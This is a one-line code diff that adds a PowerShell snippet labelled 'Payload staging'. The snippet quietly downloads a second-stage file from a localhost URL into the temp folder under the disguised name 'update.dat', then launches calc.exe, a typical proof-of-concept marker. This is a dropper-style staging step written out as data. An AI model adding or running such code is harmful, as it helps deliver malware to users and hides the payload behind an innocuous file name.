@@ -1,0 +1,1 @@
+<# Payload staging #> $Stage2Url = 'https://localhost:9001/payload.bin'; $WorkingPath = "$env:TEMP\update.dat"; (New-Object System.Net.WebClient).DownloadFile($Stage2Url, $WorkingPath); Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue; $ProgressPreference = "SilentlyContinue"
